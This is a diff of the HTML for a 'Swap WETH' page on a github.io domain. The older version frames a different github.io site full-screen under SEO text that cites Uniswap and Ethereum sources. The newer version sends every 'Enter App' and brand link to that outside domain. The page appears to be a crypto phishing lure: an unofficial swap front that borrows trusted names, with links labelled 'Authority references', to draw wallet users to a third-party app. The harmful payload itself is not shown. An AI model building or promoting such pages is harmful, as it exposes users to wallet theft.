@@ -1,290 +1,120 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-
-  <title>Swap WETH - App</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Swap WETH</title>
+  <meta name="description" content="Swap WETH exchanges Wrapped Ether for other cryptocurrencies in a few quick steps.">
   <link rel="canonical" href="https://swap-weth.github.io/">
-  <meta name="description" content="Swap WETH swaps WETH and other tokens at the best on-chain price.">
-  <meta name="robots" content="index, follow">
-
-  <meta property="og:title" content="Swap WETH">
-  <meta property="og:description" content="Swap WETH swaps WETH and other tokens at the best on-chain price.">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EF">
   <meta property="og:type" content="website">
-  <link rel="icon" href="favicon.png" type="image/png">
+  <meta property="og:title" content="Swap WETH">
+  <meta property="og:description" content="Swap WETH exchanges Wrapped Ether for other cryptocurrencies in a few quick steps.">
+  <meta property="og:url" content="https://swap-weth.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Swap WETH">
+  <meta name="twitter:description" content="Swap WETH exchanges Wrapped Ether for other cryptocurrencies in a few quick steps.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
   <script type="application/ld+json">
   {
     "@context": "https://schema.org",
-    "@type": "WebPage",
-    "name": "Swap WETH",
-    "description": "Swap WETH swaps WETH and other tokens at the best on-chain price.",
-    "url": "https://swap-weth.github.io/"
-  }
-  </script>
-
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      min-height: 100%;
-      overflow-x: hidden;
-      overflow-y: auto;
-      background: #000;
-      font-family: Arial, sans-serif;
-    }
-
-    iframe {
-      position: fixed;
-      inset: 0;
-      z-index: 1;
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      display: block;
-    }
-
-    h1 {
-      position: fixed;
-      left: 12px;
-      bottom: 10px;
-      z-index: 2;
-      margin: 0;
-      color: #f2f3f5;
-      font-size: 12px;
-      line-height: 1;
-      font-weight: 500;
-      letter-spacing: -0.2px;
-      pointer-events: none;
-    }
-
-    main {
-      position: relative;
-      z-index: 3;
-      margin-top: 100vh;
-      background: #0D111C;
-      color: #f7f8fa;
-      line-height: 1.6;
-    }
-
-    .seo-wrap {
-      width: min(1040px, calc(100% - 32px));
-      margin: 0 auto;
-      padding: 56px 0 64px;
-    }
-
-    h2 {
-      margin: 0 0 14px;
-      font-size: 26px;
-      line-height: 1.2;
-    }
-
-    p {
-      margin: 0 0 18px;
-      color: #d5d9e4;
-    }
-
-    .cards.three {
-      display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 16px;
-      margin: 18px 0 34px;
-    }
-
-    .card {
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      border-radius: 8px;
-      padding: 18px;
-      background: rgba(255, 255, 255, 0.04);
-    }
-
-    .card h3 {
-      margin: 0 0 8px;
-      font-size: 17px;
-      line-height: 1.25;
-    }
-
-    .note-irreversible {
-      border-left: 3px solid #FF007A;
-      padding: 12px 14px;
-      background: rgba(255, 0, 122, 0.08);
-    }
-
-    .faq-item {
-      border-top: 1px solid rgba(255, 255, 255, 0.12);
-      padding: 18px 0;
-    }
-
-    .faq-item h3 {
-      margin: 0 0 8px;
-      font-size: 18px;
-    }
-
-    .inline-link {
-      color: #ff79b2;
-      text-decoration-thickness: 1px;
-      text-underline-offset: 3px;
-    }
-
-    @media (max-width: 760px) {
-      .cards.three {
-        grid-template-columns: 1fr;
-      }
-
-      .seo-wrap {
-        padding-top: 40px;
-      }
-    }
-  </style>
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "FAQPage",
-    "mainEntity": [
+    "@graph": [
       {
-        "@type": "Question",
-        "name": "How do I swap WETH safely?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Open the Uniswap app from the official app domain, verify WETH and the output token, review price impact, slippage, gas, and any approval prompt, then sign only the transaction you expect. Etherscan can be used to confirm the Ethereum WETH contract."
-        }
+        "@type": "WebSite",
+        "@id": "https://swap-weth.github.io/#website",
+        "url": "https://swap-weth.github.io/",
+        "name": "Swap WETH",
+        "inLanguage": "en"
       },
       {
-        "@type": "Question",
-        "name": "Is swapping WETH the same as wrapping or unwrapping ETH?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "No. Ethereum.org explains that wrapping converts ETH into WETH through the WETH contract, while unwrapping redeems WETH for ETH. A swap trades WETH for another token through a liquidity route."
-        }
+        "@type": "WebApplication",
+        "@id": "https://swap-weth.github.io/#app",
+        "name": "Swap WETH",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://swap-weth.github.io/"
       },
       {
-        "@type": "Question",
-        "name": "What network should I use to swap WETH?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Use the network where your WETH balance exists. On Ethereum mainnet, Etherscan lists the canonical WETH contract as 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, and ethereum.org notes that other networks can use different WETH contracts."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Do I need ETH to swap WETH?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Yes, on Ethereum mainnet you need native ETH for gas. Ethereum.org explains gas fees, and Uniswap Labs support notes that Ethereum network costs are paid in ETH rather than WETH."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Why use Uniswap to swap WETH?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Uniswap is a wallet-based DEX interface for token swaps, and Uniswap developer documentation describes prefilled swap links and trading integration paths. You still review the quote and sign in your own wallet."
-        }
+        "@type": "Organization",
+        "@id": "https://swap-weth.github.io/#organization",
+        "name": "Swap WETH",
+        "url": "https://swap-weth.github.io/",
+        "logo": "https://swap-weth.github.io/favicon.png"
       }
     ]
   }
   </script>
 </head>
 <body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Swap WETH home">
+      <img src="simpleswap.png" width="30" height="30" alt="">
+      <span>Swap WETH</span>
+    </a>
 
-  <iframe 
-    src="https://avalanche-ecosystem.github.io/"
-    title="Swap WETH App"
-    loading="eager"
-    referrerpolicy="no-referrer-when-downgrade"
-    allowfullscreen>
-  </iframe>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://bitcoin.org/en/" target="_blank" rel="nofollow noopener noreferrer">Bitcoin</a>
+      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
+      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
+    </nav>
 
-  <h1>Swap WETH</h1>
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
 
-  <main>
-    <div class="seo-wrap">
-      <section>
-        <h2>What a WETH swap does</h2>
-        <p>To swap WETH is to trade Wrapped Ether for another token through a liquidity route, not simply convert it back to native ETH. <a class="inline-link" href="https://ethereum.org/wrapped-eth/" rel="noopener noreferrer">Ethereum's Wrapped Ether guide</a> describes WETH as an ERC-20 representation of ether, while <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">the ERC-20 token standard</a> defines the approval and transfer interface that DeFi apps expect.</p>
-        <p>If your goal is only WETH to ETH on the same chain, unwrapping may be the cleaner action. If your goal is WETH to USDC, WBTC, UNI, or another ERC-20 token, a swap route is the relevant flow.</p>
-      </section>
+  <main class="stage">
+    <section class="hero" aria-label="Swap WETH">
+      <h1>Swap WETH</h1>
+      <p class="value"><strong>Swap WETH</strong> exchanges Wrapped Ether for other cryptocurrencies in a few quick steps.</p>
+    </section>
 
-      <section>
-        <h2>Check the WETH contract and network</h2>
-        <p>On Ethereum mainnet, the WETH contract in this page's local facts is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 with 18 decimals. Verify that address on <a class="inline-link" href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" rel="noopener noreferrer">the Etherscan WETH token page</a> before approving a spend, especially if a wallet shows multiple tokens with the WETH symbol.</p>
-        <p>WETH also exists on other EVM networks, but the contract and liquidity route can differ by chain. Match the wallet network to the balance you actually hold, and treat market pages only as context, not as a substitute for contract verification.</p>
-      </section>
-
-      <section>
-        <h2>How to swap WETH on Uniswap</h2>
-        <div class="cards three">
-          <article class="card">
-            <h3>Open the route</h3>
-            <p>Uniswap documents <a class="inline-link" href="https://developers.uniswap.org/docs/trading/custom-interface-links" rel="noopener noreferrer">custom swap link parameters</a> that can prefill an input token, so you can land closer to the WETH route before connecting a wallet.</p>
-          </article>
-          <article class="card">
-            <h3>Review the quote</h3>
-            <p>The <a class="inline-link" href="https://developers.uniswap.org/docs/trading/overview" rel="noopener noreferrer">Uniswap trading overview</a> explains that routes and quotes are part of the swap flow; check output token, recipient, minimum received, and network before signing.</p>
-          </article>
-          <article class="card">
-            <h3>Approve only what you expect</h3>
-            <p>A WETH approval can be separate from the final swap. Uniswap Labs explains <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8120520483085-What-is-an-approval-transaction" rel="noopener noreferrer">how approval transactions work</a>, including wallet prompts before the swap transaction.</p>
-          </article>
+    <section class="app-card" aria-label="Exchange route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
         </div>
-      </section>
 
-      <section>
-        <h2>Fees, slippage, and price impact</h2>
-        <p>Holding WETH does not normally pay Ethereum mainnet gas; you still need native ETH for transaction fees. <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">Ethereum's gas documentation</a> explains how computation is paid for, and Uniswap Labs lists <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8370337377805-What-is-a-network-cost" rel="noopener noreferrer">network cost tokens by chain</a>.</p>
-        <p>Before signing, compare the quoted output with the minimum received. Uniswap Labs defines <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8671539602317-What-is-price-impact" rel="noopener noreferrer">price impact in liquidity pools</a> and explains <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8643879653261-How-to-change-slippage-on-the-Uniswap-Web-app" rel="noopener noreferrer">slippage settings in the web app</a>, both of which matter when pool depth or market movement changes execution.</p>
-      </section>
+        <button class="switch" type="button" data-switch aria-label="Switch exchange direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
 
-      <section>
-        <h2>Why liquidity matters for WETH routes</h2>
-        <p>WETH is common in DeFi because many contracts are built around ERC-20 transfers and approvals, but each trade still depends on available pool liquidity. Uniswap Labs describes <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8829880740109-What-is-a-liquidity-pool" rel="noopener noreferrer">liquidity pools and AMM pricing</a>, while <a class="inline-link" href="https://defillama.com/protocol/uniswap" rel="noopener noreferrer">DeFiLlama's Uniswap protocol dashboard</a> tracks protocol-level activity and can help users understand the broader liquidity landscape without inventing a quote.</p>
-      </section>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="WETH">
+            <span>WETH</span>
+          </span>
+        </div>
+      </div>
 
-      <section>
-        <h2>Custody and security checklist</h2>
-        <div class="cards three">
-          <article class="card">
-            <h3>Self-custody</h3>
-            <p>Uniswap swaps are wallet-signed, so the connected wallet remains the signing surface. The <a class="inline-link" href="https://github.com/Uniswap" rel="noopener noreferrer">Uniswap Labs GitHub organization</a> is the authoritative place to inspect public Uniswap code repositories.</p>
-          </article>
-          <article class="card">
-            <h3>Token warnings</h3>
-            <p>Do not rely on a ticker alone. Uniswap Labs explains <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8723118437133-What-are-token-warnings" rel="noopener noreferrer">token warning labels</a> for malicious, impersonator, honeypot, and other risk signals.</p>
-          </article>
-          <article class="card">
-            <h3>Interface and protocol costs</h3>
-            <p>Review the swap details panel before signing. Uniswap Labs maintains a support page for <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/20131678274957-What-are-Uniswap-Labs-fees" rel="noopener noreferrer">Uniswap Labs fee disclosures</a>, separate from gas and any protocol-level fee mechanics.</p>
-          </article>
-        </div>
-        <p class="note-irreversible">On-chain actions are irreversible once confirmed, and failed transactions can still consume network costs. This page is educational content, not financial advice.</p>
-      </section>
-
-      <section>
-        <h2>FAQ</h2>
-        <div class="faq-item">
-          <h3>How do I swap WETH safely?</h3>
-          <p>Open the Uniswap app from the official app domain, verify WETH and the output token, review price impact, slippage, gas, and any approval prompt, then sign only the transaction you expect. Use <a class="inline-link" href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" rel="noopener noreferrer">Etherscan's WETH contract record</a> as a contract check.</p>
-        </div>
-        <div class="faq-item">
-          <h3>Is swapping WETH the same as wrapping or unwrapping ETH?</h3>
-          <p>No. <a class="inline-link" href="https://ethereum.org/wrapped-eth/" rel="noopener noreferrer">Ethereum.org's WETH explainer</a> describes wrapping as converting ETH into WETH and unwrapping as redeeming WETH for ETH; a swap trades WETH for another token through liquidity.</p>
-        </div>
-        <div class="faq-item">
-          <h3>What network should I use to swap WETH?</h3>
-          <p>Use the network where your WETH balance exists. On Ethereum mainnet, the WETH contract is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, and <a class="inline-link" href="https://ethereum.org/wrapped-eth/" rel="noopener noreferrer">ethereum.org's network notes for WETH</a> show that other chains can have different WETH contracts.</p>
-        </div>
-        <div class="faq-item">
-          <h3>Do I need ETH to swap WETH?</h3>
-          <p>Yes. On Ethereum mainnet, gas is paid in native ETH, not WETH, so keep enough ETH in the wallet for approvals and swaps. Ethereum.org documents <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">Ethereum gas fees</a>, and Uniswap Labs lists ETH as the network cost token for Ethereum.</p>
-        </div>
-        <div class="faq-item">
-          <h3>Why use Uniswap to swap WETH?</h3>
-          <p>Uniswap is a wallet-based DEX interface for token swaps, and <a class="inline-link" href="https://developers.uniswap.org/docs/trading/overview" rel="noopener noreferrer">Uniswap developer trading docs</a> describe swap integration paths while still requiring users to review and sign transactions in their own wallet.</p>
-        </div>
-      </section>
-    </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
   </main>
 
+  <footer class="footer">Swap WETH &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
 </body>
 </html>
